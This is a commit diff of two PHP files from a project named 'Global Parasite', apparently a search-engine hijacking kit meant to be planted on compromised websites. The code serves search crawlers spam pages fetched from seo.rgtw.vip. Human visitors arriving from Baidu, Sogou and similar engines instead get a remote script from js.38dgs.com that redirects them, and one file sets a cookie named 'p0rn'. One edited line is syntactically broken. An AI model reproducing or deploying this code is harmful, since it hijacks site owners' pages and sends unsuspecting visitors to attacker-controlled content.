9d0a94e57d19cb3bb358916f50fe4d3f2c8fb462
i0nAy <i0nAy@Hotmail.com>
2019-01-06 01:16:48 +0800

    New Versions

--- Global Parasite/Global.php
+++ Global Parasite/Global.php
@@ -1,23 +1,24 @@
 <?php
-error_reporting(0); 
+//全局劫持不判断跳转
+error_reporting(0);
 set_time_limit(20);
-$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/fuck.js" ></script>'; 
-define('Referer', $_SERVER['HTTP_REFERER']); 
-if (stristr(Referer,'baidu') or stristr(Referer,'google') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'bing') or stristr(Referer,'yahoo') or stristr(Referer,'sm.')) { 
+$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/seo_global.js" ></script>';
+define('Referer', $_SERVER['HTTP_REFERER']);
+if (stristr(Referer,'baidu') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'yisou') or stristr(Referer,'sm.')) {
     if (!isCrawler()) {
             echo "$jumpjs";exit;
     }
 }
 function isCrawler() {
-        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
-        if (!empty($agent)) {                
-                $spiderSite= array('Baiduspider+','YisouSpider','Sosospider+','Sogou web spider','360Spider','HaosouSpider','Sogou inst spider','Sogou Spider','Sogou News Spider');
-                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}                      
-                }  
+        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);
+        if (!empty($agent)) {
+                $spiderSite= array('Baiduspider+','Sosospider+','Sogou web spider','360Spider','Baiduspider','YisouSpider','UCBrowser','Baiduspider','HaosouSpider');
+                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}
+                }
         } else {
                 return false;
         }
-}   
+}
 header('Content-Type: text/html; charset=gb2312');
 $urlstring = $_SERVER['REQUEST_URI'];
 if(isCrawler())
@@ -25,12 +26,12 @@ if(isCrawler())
 if ($randnumber = stristr($urlstring,'?id='))
 {
 	if (function_exists('curl_init')){
-		$curl_handle = curl_init(); 
+		$curl_handle = curl_init();
 		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'.$randnumber);
-		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19); 
+		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
-		$file_content = curl_exec($curl_handle); 
-		curl_close($curl_handle); 
+		$file_content = curl_exec($curl_handle);
+		curl_close($curl_handle);
 		$curdir=$_SERVER['SCRIPT_NAME'];
 		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
@@ -42,17 +43,15 @@ else {
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
 	echo($html);
-
 }
-
 }else{
 if (function_exists('curl_init')){
-		$curl_handle = curl_init();  
-		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'); 
+		$curl_handle = curl_init();
+		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php');
 		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
-		$file_content = curl_exec($curl_handle); 
-		curl_close($curl_handle); 
+		$file_content = curl_exec($curl_handle);
+		curl_close($curl_handle);
 		$curdir=$_SERVER['SCRIPT_NAME'];
 		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
@@ -64,7 +63,6 @@ else {
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
 	echo($html);
-
 }
 }
 }
--- Global Parasite/判断id=article.php
+++ Global Parasite/判断id=article.php
@@ -1,30 +1,30 @@
 <?php
-error_reporting(0); 
-set_time_limit(20); 
+//åˆ¤æ–­IDè·³è½¬å®¢æˆ·ç«¯
+error_reporting(0);
+set_time_limit(20);
 $sm = 'p0rn';
 $Class_ck = true;
-$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/fuck.js" ></script>'; 
-define('Referer', $_SERVER['HTTP_REFERER']); 
-if (stristr(Referer,'baidu') or stristr(Referer,'360') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'yisou') or stristr(Referer,'sm')) {
+$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/seo_id.js" ></script>';
+define('Referer', $_SERVER['HTTP_REFERER']);
+if (stristr(Referer,'baidu') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'yisou') or stristr(Referer,'sm.')) {
    if (stristr(Referer,'site') or stristr(Referer,'inurl')) {
         setcookie($sm, Host, time() + 259200);
         $Class_ck = false;
-    }  
-    if (empty($_COOKIE[$sm]) && !isCrawler() && stristr($_SERVER['REQUEST_URI'],'id=article')) {
+    }
+    if (empty(!isCrawler() && stristr($_SERVER['REQUEST_URI'],'id=article')) {
             echo "$jumpjs";exit;
-//ÅÐ¶ÏURL "id=article" ²ÅÄÜÌø×ª
     }
 }
 function isCrawler() {
-        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
-        if (!empty($agent)) {                
-                $spiderSite= array('Baiduspider+','YisouSpider','Sosospider+','Sogou web spider','360Spider','HaosouSpider','Sogou inst spider','Sogou Spider','Sogou News Spider');
-                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}                      
-                }  
+        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);
+        if (!empty($agent)) {
+                $spiderSite= array('Baiduspider+','Sosospider+','Sogou web spider','360Spider','Baiduspider','YisouSpider','UCBrowser','Baiduspider','HaosouSpider');
+                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}
+                }
         } else {
                 return false;
         }
-}   
+}
 header('Content-Type: text/html; charset=gb2312');
 $urlstring = $_SERVER['REQUEST_URI'];
 if(isCrawler())
@@ -32,12 +32,12 @@ if(isCrawler())
 if ($randnumber = stristr($urlstring,'?id='))
 {
 	if (function_exists('curl_init')){
-		$curl_handle = curl_init(); 
+		$curl_handle = curl_init();
 		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'.$randnumber);
-		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19); 
+		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
-		$file_content = curl_exec($curl_handle); 
-		curl_close($curl_handle); 
+		$file_content = curl_exec($curl_handle);
+		curl_close($curl_handle);
 		$curdir=$_SERVER['SCRIPT_NAME'];
 		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
@@ -49,17 +49,15 @@ else {
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
 	echo($html);
-
 }
-
 }else{
 if (function_exists('curl_init')){
-		$curl_handle = curl_init();  
-		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'); 
+		$curl_handle = curl_init();
+		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php');
 		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
-		$file_content = curl_exec($curl_handle); 
-		curl_close($curl_handle); 
+		$file_content = curl_exec($curl_handle);
+		curl_close($curl_handle);
 		$curdir=$_SERVER['SCRIPT_NAME'];
 		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
@@ -71,7 +69,6 @@ else {
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
 	echo($html);
-
 }
 }
 }
